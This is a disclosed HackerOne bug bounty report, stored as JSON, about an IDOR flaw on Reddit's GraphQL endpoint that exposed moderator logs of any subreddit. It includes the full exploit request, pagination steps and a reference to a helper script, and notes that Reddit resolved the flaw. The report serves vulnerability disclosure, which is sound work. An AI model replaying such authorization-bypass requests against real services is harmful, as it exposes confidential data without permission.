@@ -1,0 +1,149 @@
+{
+  "id": 1658418,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjU4NDE4",
+  "url": "https://hackerone.com/reports/1658418",
+  "title": "Getting access of mod logs from any public or restricted subreddit with IDOR vulnerability",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-08-03T18:07:40.453Z",
+  "submitted_at": "2022-08-03T18:07:40.644Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "high_ping_ninja",
+    "url": "/high_ping_ninja",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/kht59s9oi5523r09bj04a1k1t46y/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35710,
+    "url": "https://hackerone.com/reddit",
+    "handle": "reddit",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/osci5oey0q0wkiom39bk5onv8p7q/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/osci5oey0q0wkiom39bk5onv8p7q/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Reddit",
+      "twitter_handle": "reddit",
+      "website": "https://www.reddit.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-08-04T19:38:47.697Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-08-03T22:10:37.755Z",
+  "team_member_agreed_on_going_public_at": "2022-08-04T19:38:47.573Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nThere's no check if the user is moderator of the particular subreddit or not while trying to access the mod logs via gql.reddit.com by using operation id. You can change the parameter **subredditName** to any target subreddit name which is public or restricted and get access to mod logs of that subreddit.\n\n## Steps To Reproduce:\n+  Log into any account as an attacker and get the authorization token\n+ Send request given below at gql.reddit.com\n```\nPOST / HTTP/2\nHost: gql.reddit.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nContent-Length: 62\nX-Reddit-Compression: 1\nOrigin: https://www.reddit.com\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-site\nAuthorization: Bearer ourtoken\nReferer: https://www.reddit.com/\nTe: trailers\n\n{\"id\":\"6243efcbc61d\",\"variables\":{\"subredditName\":\"any-subreddit\"}}\n```\nThe response will look something like below\n{F1851522}\n+ It only gives one page of logs.Look at the response and see if the value of **hasNextPage** is true or false. If It's false then there are no more logs other than the ones we got\n+ If it's true then there are more logs and we can get them by just adding new variable **after** and assigning value of **endCursor**, which we can see in the reponse body of our request {F1851533}\n+ Final request body will look something like this\n```\n{\"id\":\"6243efcbc61d\",\"variables\":{\"subredditName\":\"any-subreddit\",\n\"after\":\"code-from-endCursor\"\n}}\n```\n+ After sending the request we'll get second page of logs. If we still get **hasNextPage** as true, Keep doing this untill we see **hasNextPage** set to false in the response. by doing this we can get all the pages of mod logs one by one.\n\n> Use this script to make things easier in confirming this vulnerability (F1851561)\n> The output will get stored in mod_log_out.txt in the same directory\n\n  * [attachment / reference]\n\nF1851522\nF1851533\nF1851561\n\n## Impact\n\nConfidential information getting exposed.",
+  "bounty_amount": "5000.0",
+  "formatted_bounty": "$5,000",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1851522,
+      "file_name": "responsebody1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9qzg80jk5k09y8xtov6y2bmp2aln?response-content-disposition=attachment%3B%20filename%3D%22responsebody1.png%22%3B%20filename%2A%3DUTF-8%27%27responsebody1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYRGLGVFY%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T215802Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCfLlDFG2q2gON9U2InKOX70IIJEipFnshVB9AURT3itQIhAJ0TzHeg4rx%2BmL81OfKftiaITDhIznDtYoNmxRqoxKHSKrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igx8e4gK3c1aOJt5J%2BkqjwUXzbsHxNy9lG126gfTZlXYm5oF5NDmCDwVMP6Ago0C2pha5zPbYwp9hAB%2BJscd8cu8lA%2BRn55ATbIy4bMDSKkU%2FltgPttx9GIdlQSGKckW9aDR4B%2Bnu0mSn2vuoIJyeMjdgNER0DGdBhvsD57by%2BN2bMe7EzT0tDZze8%2Ffq29t1pv4EbnASwscPecuM1jZzsJs7Ew0cxmJvnSxbPkHEVTFTVhXhXvPcbhT%2FjHONyk%2BPkdF4zbN2j0RPji5NjGuaFlvshtzGcpmyTh9OiReyMiOT4g33Mv4MWwB%2BRKaPhcGyH63%2Bz5niNyqA7RiPy0pclyjFj3ui7yICKtdJ%2F%2FvfI7GuDCug685unb14NDP7XSXww%2BprA7GMqnNoMjrslbKvWGjPwOqN08fqPEjntf0E2v5CfOTpin9H8CmNcedc4%2BfYv85g%2FwujDL1y67Foavql5ADnPFZJMSdVUCG9V8AY9FRxMn6TR%2BlOlwIjqWn3IsxIaDoEyLKty284BEIG1U0oLS7iHTDDKizhlAZRbGoAUva%2BLmzbQqHdg4EllU9k7v%2FrI7HBgUR5QJUYwis%2Bnp0uSBzsTJGw2h1RP0kcDx2tFUoIUbZFlK%2F%2B8jNbhULDZFbkRq4uLvs0dZ8Og%2B39yU1CSA2wkyO%2F85aMzmHd9YBfr2oMsWun9FVGHRiicObSSBSIfftRFKGgEJEkZxU1OzBKMqJJFAPZgY5zQVsseJl7BwaoWPQWy204qbodVe%2F7Qv%2Fnf37YOc3jqmLKh94zzoJ4%2BmzX7Ifx0Ir3D0DExtahV6rs%2BBOIXxzsLsdIJkFR%2BbAgJq1JTDlOqPeeuTsW9aET%2BaEV3XNmfs0nDI6iR67%2BvlLCSVrLP%2BPTEE37NsSkjDqMK%2FH4swGOrAB8KREP1yc88Eg1T4isVwEc%2F6%2BPgBvXICV2axr%2B189UoTMB6PDmkQqv%2FXjWX%2ByQeGyft2KYnWIoVvMaSFLVaiCjKl5T4DhIE%2FddbQGDapU4gyOU6Prn3uUQzazS9d7CXAna3Jfw9VBrCIoe9C4TIRTP7XVvBYHrBoOpM%2BHJm0vjwzS5a7lfuWOdr0Dv2o3UWQ%2FdagaQCswU2q1EsUgp1PKNJtY5%2FAvSF4qMBM0fzJemGo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=abbd463a21f5d97f0e20e40c52e0d22ba34dfe44ca51b710019aca527ff875d5",
+      "file_size": 48511,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1851533,
+      "file_name": "endCursorCode.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3oageoebxxhzxs6u9148566ma8au?response-content-disposition=attachment%3B%20filename%3D%22endCursorCode.png%22%3B%20filename%2A%3DUTF-8%27%27endCursorCode.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYRGLGVFY%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T215802Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCfLlDFG2q2gON9U2InKOX70IIJEipFnshVB9AURT3itQIhAJ0TzHeg4rx%2BmL81OfKftiaITDhIznDtYoNmxRqoxKHSKrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igx8e4gK3c1aOJt5J%2BkqjwUXzbsHxNy9lG126gfTZlXYm5oF5NDmCDwVMP6Ago0C2pha5zPbYwp9hAB%2BJscd8cu8lA%2BRn55ATbIy4bMDSKkU%2FltgPttx9GIdlQSGKckW9aDR4B%2Bnu0mSn2vuoIJyeMjdgNER0DGdBhvsD57by%2BN2bMe7EzT0tDZze8%2Ffq29t1pv4EbnASwscPecuM1jZzsJs7Ew0cxmJvnSxbPkHEVTFTVhXhXvPcbhT%2FjHONyk%2BPkdF4zbN2j0RPji5NjGuaFlvshtzGcpmyTh9OiReyMiOT4g33Mv4MWwB%2BRKaPhcGyH63%2Bz5niNyqA7RiPy0pclyjFj3ui7yICKtdJ%2F%2FvfI7GuDCug685unb14NDP7XSXww%2BprA7GMqnNoMjrslbKvWGjPwOqN08fqPEjntf0E2v5CfOTpin9H8CmNcedc4%2BfYv85g%2FwujDL1y67Foavql5ADnPFZJMSdVUCG9V8AY9FRxMn6TR%2BlOlwIjqWn3IsxIaDoEyLKty284BEIG1U0oLS7iHTDDKizhlAZRbGoAUva%2BLmzbQqHdg4EllU9k7v%2FrI7HBgUR5QJUYwis%2Bnp0uSBzsTJGw2h1RP0kcDx2tFUoIUbZFlK%2F%2B8jNbhULDZFbkRq4uLvs0dZ8Og%2B39yU1CSA2wkyO%2F85aMzmHd9YBfr2oMsWun9FVGHRiicObSSBSIfftRFKGgEJEkZxU1OzBKMqJJFAPZgY5zQVsseJl7BwaoWPQWy204qbodVe%2F7Qv%2Fnf37YOc3jqmLKh94zzoJ4%2BmzX7Ifx0Ir3D0DExtahV6rs%2BBOIXxzsLsdIJkFR%2BbAgJq1JTDlOqPeeuTsW9aET%2BaEV3XNmfs0nDI6iR67%2BvlLCSVrLP%2BPTEE37NsSkjDqMK%2FH4swGOrAB8KREP1yc88Eg1T4isVwEc%2F6%2BPgBvXICV2axr%2B189UoTMB6PDmkQqv%2FXjWX%2ByQeGyft2KYnWIoVvMaSFLVaiCjKl5T4DhIE%2FddbQGDapU4gyOU6Prn3uUQzazS9d7CXAna3Jfw9VBrCIoe9C4TIRTP7XVvBYHrBoOpM%2BHJm0vjwzS5a7lfuWOdr0Dv2o3UWQ%2FdagaQCswU2q1EsUgp1PKNJtY5%2FAvSF4qMBM0fzJemGo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d12e0b1c15c267e81b4e82a9336abde4b3f4da53971e8891522428496c45649f",
+      "file_size": 5712,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1851561,
+      "file_name": "mod_logs.sh",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bfsk3umqcn3ckn89h1ogfk4o3nn4?response-content-disposition=attachment%3B%20filename%3D%22mod_logs.sh%22%3B%20filename%2A%3DUTF-8%27%27mod_logs.sh&response-content-type=application%2Fx-shellscript&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYRGLGVFY%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T215802Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCfLlDFG2q2gON9U2InKOX70IIJEipFnshVB9AURT3itQIhAJ0TzHeg4rx%2BmL81OfKftiaITDhIznDtYoNmxRqoxKHSKrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igx8e4gK3c1aOJt5J%2BkqjwUXzbsHxNy9lG126gfTZlXYm5oF5NDmCDwVMP6Ago0C2pha5zPbYwp9hAB%2BJscd8cu8lA%2BRn55ATbIy4bMDSKkU%2FltgPttx9GIdlQSGKckW9aDR4B%2Bnu0mSn2vuoIJyeMjdgNER0DGdBhvsD57by%2BN2bMe7EzT0tDZze8%2Ffq29t1pv4EbnASwscPecuM1jZzsJs7Ew0cxmJvnSxbPkHEVTFTVhXhXvPcbhT%2FjHONyk%2BPkdF4zbN2j0RPji5NjGuaFlvshtzGcpmyTh9OiReyMiOT4g33Mv4MWwB%2BRKaPhcGyH63%2Bz5niNyqA7RiPy0pclyjFj3ui7yICKtdJ%2F%2FvfI7GuDCug685unb14NDP7XSXww%2BprA7GMqnNoMjrslbKvWGjPwOqN08fqPEjntf0E2v5CfOTpin9H8CmNcedc4%2BfYv85g%2FwujDL1y67Foavql5ADnPFZJMSdVUCG9V8AY9FRxMn6TR%2BlOlwIjqWn3IsxIaDoEyLKty284BEIG1U0oLS7iHTDDKizhlAZRbGoAUva%2BLmzbQqHdg4EllU9k7v%2FrI7HBgUR5QJUYwis%2Bnp0uSBzsTJGw2h1RP0kcDx2tFUoIUbZFlK%2F%2B8jNbhULDZFbkRq4uLvs0dZ8Og%2B39yU1CSA2wkyO%2F85aMzmHd9YBfr2oMsWun9FVGHRiicObSSBSIfftRFKGgEJEkZxU1OzBKMqJJFAPZgY5zQVsseJl7BwaoWPQWy204qbodVe%2F7Qv%2Fnf37YOc3jqmLKh94zzoJ4%2BmzX7Ifx0Ir3D0DExtahV6rs%2BBOIXxzsLsdIJkFR%2BbAgJq1JTDlOqPeeuTsW9aET%2BaEV3XNmfs0nDI6iR67%2BvlLCSVrLP%2BPTEE37NsSkjDqMK%2FH4swGOrAB8KREP1yc88Eg1T4isVwEc%2F6%2BPgBvXICV2axr%2B189UoTMB6PDmkQqv%2FXjWX%2ByQeGyft2KYnWIoVvMaSFLVaiCjKl5T4DhIE%2FddbQGDapU4gyOU6Prn3uUQzazS9d7CXAna3Jfw9VBrCIoe9C4TIRTP7XVvBYHrBoOpM%2BHJm0vjwzS5a7lfuWOdr0Dv2o3UWQ%2FdagaQCswU2q1EsUgp1PKNJtY5%2FAvSF4qMBM0fzJemGo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f677157e5872476a3d5f22982e3b1df277bca6934db6e99267be187d8f523838",
+      "file_size": 1418,
+      "type": "application/x-shellscript",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 150,
+  "voters": [
+    "saltify",
+    "0xh4cker",
+    "r4d1kal",
+    "xenx",
+    "jumpydata",
+    "loaymorad",
+    "alpernae",
+    "strawp",
+    "tinmo",
+    "0xm5awy",
+    "and 140 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 45113,
+    "asset_type": "URL",
+    "asset_identifier": "gql.reddit.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
